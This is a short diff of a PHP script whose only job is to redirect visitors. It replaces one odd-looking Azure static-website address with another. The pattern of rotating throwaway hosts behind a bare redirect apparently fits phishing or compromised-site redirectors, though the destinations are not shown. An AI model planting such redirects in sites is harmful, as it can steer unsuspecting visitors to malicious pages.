@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://glowingsss.z19.web.core.windows.net/");
+header("Location: https://mapdircoreee.z13.web.core.windows.net/");
  
 exit;
 ?>
